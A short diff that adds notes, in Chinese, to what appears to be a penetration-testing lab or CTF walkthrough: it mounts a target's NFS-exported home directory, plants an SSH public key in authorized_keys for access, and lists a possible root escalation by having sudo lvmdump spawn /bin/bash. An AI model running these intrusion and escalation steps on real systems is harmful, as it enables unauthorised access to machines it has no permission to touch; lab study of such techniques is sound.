@@ -137,3 +137,16 @@ rpcbind=0.0.0.0
 ```
 
 ## nfs 挂载
+
+```bash
+sudo mkdir /mnt/Illogical-1
+sudo sudo mount -t nfs 10.10.110.102:/home/barbara /mnt/Illogical-1 -o nolock
+```
+
+直接写入一个 ssh 公钥文件为 `.ssh/authorized_keys`
+
+## 提权 (可能)
+
+```bash
+sudo lvmdump --debug -c "/bin/bash"
+```
